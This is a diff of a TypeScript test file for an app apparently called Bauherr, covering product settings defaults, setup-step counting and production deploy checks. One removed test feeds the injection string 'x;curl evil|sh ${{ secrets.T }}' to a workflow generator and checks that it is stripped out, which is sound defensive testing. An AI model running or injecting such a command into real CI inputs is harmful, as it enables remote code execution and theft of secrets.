@@ -1,7 +1,6 @@
 import type { Payload } from 'payload'
-import { FakeBackend } from '@bauherr/adapters'
 import { afterAll, beforeAll, expect, it, vi } from 'vitest'
-import { deployErrors, productionCallouts, productionWorkflow, setupOf } from '../src/app/(app)/lib/product-setup'
+import { setupOf } from '../src/app/(app)/lib/product-setup'
 import { createTestDb, type TestDb } from './helpers/test-db'
 
 let payload: Payload
@@ -23,14 +22,24 @@ afterAll(async () => {
   await testDb?.drop(payload)
 })
 
-it('loadProduct answers undefined for a Product of another Workspace and shows the production state', async () => {
-  const { loadProduct } = await import('../src/app/(app)/lib/settings')
+it('productSettings answers null for a Product of another Workspace and reads the defaults', async () => {
+  const { productSettings } = await import('../src/core/views/product-settings')
   const [mine, other] = await Promise.all(['ps-mine', 'ps-other'].map((slug) => payload.create({ collection: 'workspaces', data: { name: slug, slug }, ...o })))
   const product = await payload.create({ collection: 'products', data: { name: 'Shop', slug: 'shop', workspace: mine!.id as number }, ...o })
-  expect(await loadProduct(other!.id as number, product.id as number)).toBeUndefined()
-  const found = await loadProduct(mine!.id as number, product.id as number)
-  expect(found?.product.deploy.productionGate).toBe(false)
-  expect(found?.product.setup.production).toBe('Off')
+  expect(await productSettings(payload, { workspace: other!.id as number, product: product.id as number })).toBeNull()
+  expect(await productSettings(payload, { workspace: mine!.id as number, product: product.id as number })).toMatchObject({
+    state: 'observing',
+    executor: 'session',
+    riskAreas: [],
+    excludedLabels: [],
+    outsideIssuesPerDay: 5,
+    reporterRemindDays: 7,
+    reporterSilentDays: 21,
+    backlogBriefLimit: 5,
+    autoClose: true,
+    productionGate: false,
+    sources: [],
+  })
 })
 
 it('loadWorkspaceSettings offers the preset models and shows the first Connection\'s tiers as bare ids', async () => {
@@ -44,101 +53,12 @@ it('loadWorkspaceSettings offers the preset models and shows the first Connectio
   expect(w.modelByTier).toEqual({ cheap: 'claude-haiku-5-5', standard: 'greenpt/glm-5.3', strong: 'claude-opus-5-5' })
 })
 
-const base = { repositories: [{}], sources: [{}], deploy: { stagingUrl: 'https://s.example.com', mode: 'observe-ci', webhookUrl: '', productionGate: true, productionChecks: 'deploy-prod' } }
+const base = { repositories: [{}], sources: [{}], deploy: { stagingUrl: 'https://s.example.com', productionGate: true } }
 
 it('setupOf counts open steps and words the production approval', () => {
   expect(setupOf(base)).toMatchObject({ open: 0, production: 'On' })
-  const open = setupOf({ ...base, repositories: [], deploy: { ...base.deploy, stagingUrl: '', productionChecks: '' } })
-  expect(open).toMatchObject({ open: 3, production: 'On, needs checks' })
-  expect(open.rows.map((r) => r.word)).toEqual(['Needs setup', 'Needs setup', 'Needs setup'])
-  expect(setupOf({ ...base, deploy: { ...base.deploy, productionGate: false, productionChecks: '' } })).toMatchObject({ open: 0, production: 'Off' })
-  expect(setupOf({ ...base, deploy: { ...base.deploy, mode: 'webhook' } }).rows[1]!.word).toBe('Needs setup')
-})
-
-it('deployErrors names each invalid field in plain words', () => {
-  const ok = { stagingUrl: '', deployMode: 'observe-ci', deployWebhookUrl: '', productionWebhookUrl: '', productionGate: false, productionChecks: '' }
-  expect(deployErrors(ok)).toEqual({})
-  expect(deployErrors({ ...ok, deployMode: 'webhook' })).toEqual({
-    deployWebhookUrl: 'Required when Bauherr calls your deploy hook.',
-    stagingUrl: 'Required: Bauherr checks this address to see the deploy finished.',
-  })
-  expect(deployErrors({ ...ok, stagingUrl: 'ftp://x', productionGate: true })).toEqual({
-    stagingUrl: 'Enter an address starting with https://.',
-    productionChecks: 'Pick the check your production deploy reports. Without it, Bauherr cannot tell when the deploy finished.',
-  })
-})
-
-const callout = (o: Partial<Parameters<typeof productionCallouts>[0]>) => productionCallouts({ checks: [], seen: [], ...o })
-
-it('productionCallouts words Not ready, Almost ready and Ready', () => {
-  expect(callout({})).toMatchObject([{ tone: 'warn', lead: 'Not ready' }])
-  const almost = callout({ checks: ['deploy-production'], seen: ['lint'] })
-  expect(almost).toMatchObject([{ tone: 'warn', lead: 'Almost ready' }])
-  expect(almost[0]!.text).toContain('deploy-production has not reported on recent commits')
-  expect(callout({ checks: ['deploy-production'], seen: ['lint', 'deploy-production'] })).toMatchObject([{ tone: 'ok', lead: 'Ready' }])
-  const partial = callout({ checks: ['a', 'b'], seen: ['b'] })
-  expect(partial[0]).toMatchObject({ lead: 'Almost ready' })
-  expect(partial[0]!.text).toContain('a has not reported')
-})
-
-it('productionCallouts calls a check ready when the forge cannot be read', () => {
-  expect(callout({ checks: ['deploy-production'], seen: null })).toMatchObject([{ lead: 'Ready', text: expect.stringContaining('not confirmed') }])
-})
-
-it('productionWorkflow reports the picked check on the Ticket merge commit', () => {
-  const yaml = productionWorkflow(['deploy-production', 'notify-prod'])
-  expect(yaml).toContain("github.event.label.name == 'bauherr:approved:production'")
-  expect(yaml).toContain('        deploy-production\n        notify-prod\n')
-  expect(yaml).toContain('head_sha="$SHA"')
-  expect(yaml).toContain('--limit 200')
-  const hostile = productionWorkflow(['x;curl evil|sh ${{ secrets.T }}'])
-  expect(hostile).not.toContain('${{ secrets.T }}')
-  expect(hostile).not.toMatch(/-f name=x/)
-})
-
-const ok = (name: string, id?: number) => ({ name, status: 'completed', conclusion: 'success', id })
-
-it('collectChecks counts each name once per commit, sorts by how often it was seen, then by name', async () => {
-  const { collectChecks } = await import('../src/app/(app)/lib/settings')
-  const fake = new FakeBackend()
-  fake.setCommits('acme/web', [1, 2, 3].map((n) => ({ sha: `c${n}`, message: `m${n}` })))
-  fake.setChecks('acme/web', 'c1', [ok('lint'), ok('deploy-production'), { name: 'lint', status: 'completed', conclusion: 'failure', id: 5 }])
-  fake.setChecks('acme/web', 'c2', [ok('lint'), ok('build')])
-  fake.setChecks('acme/web', 'merge1', [ok('build')])
-  const found = await collectChecks(fake.forge, 'acme/web', ['merge1', 'c1'])
-  expect(found).toEqual([
-    { name: 'build', seen: 2, of: 4, lastConclusion: 'success' },
-    { name: 'lint', seen: 2, of: 4, lastConclusion: 'failure' },
-    { name: 'deploy-production', seen: 1, of: 4, lastConclusion: 'success' },
-  ])
-})
-
-it('collectChecks reads at most 10 commits, 5 of the default branch plus merge commits', async () => {
-  const { collectChecks } = await import('../src/app/(app)/lib/settings')
-  const fake = new FakeBackend()
-  fake.setCommits('acme/web', Array.from({ length: 8 }, (_, n) => ({ sha: `c${n}`, message: '' })))
-  const asked: string[] = []
-  const forge = { ...fake.forge, listChecks: async (_r: string, sha: string) => (asked.push(sha), [ok('lint')]) }
-  const found = await collectChecks(forge, 'acme/web', Array.from({ length: 9 }, (_, n) => `m${n}`))
-  expect(asked).toHaveLength(10)
-  expect(asked.slice(0, 5)).toEqual(['c0', 'c1', 'c2', 'c3', 'c4'])
-  expect(found).toEqual([{ name: 'lint', seen: 10, of: 10, lastConclusion: 'success' }])
-})
-
-it('collectChecks answers null when the forge fails or is too slow, and [] when nothing was reported', async () => {
-  const { collectChecks } = await import('../src/app/(app)/lib/settings')
-  const fake = new FakeBackend()
-  fake.setCommits('acme/web', [{ sha: 'c1', message: '' }])
-  const down = { ...fake.forge, listChecks: async () => { throw new Error('503') } }
-  expect(await collectChecks(down, 'acme/web', [])).toBeNull()
-  const slow = { ...fake.forge, getRepository: () => new Promise<never>(() => {}) }
-  expect(await collectChecks(slow, 'acme/web', [], 20)).toBeNull()
-  expect(await collectChecks(fake.forge, 'acme/web', [])).toEqual([])
-})
-
-it('recentChecks answers null for a Product without a ticket source, so the picker falls back to typing', async () => {
-  const { recentChecks } = await import('../src/app/(app)/lib/settings')
-  const ws = await payload.create({ collection: 'workspaces', data: { name: 'rc', slug: 'rc-ws' }, ...o })
-  const product = await payload.create({ collection: 'products', data: { name: 'Plain', slug: 'plain', workspace: ws.id as number }, ...o })
-  expect(await recentChecks(product.id as number)).toBeNull()
+  const open = setupOf({ ...base, repositories: [], deploy: { ...base.deploy, stagingUrl: '' } })
+  expect(open).toMatchObject({ open: 2, production: 'On' })
+  expect(open.rows.map((r) => r.word)).toEqual(['Needs setup', 'Needs setup'])
+  expect(setupOf({ ...base, deploy: { ...base.deploy, productionGate: false } })).toMatchObject({ open: 0, production: 'Off' })
 })
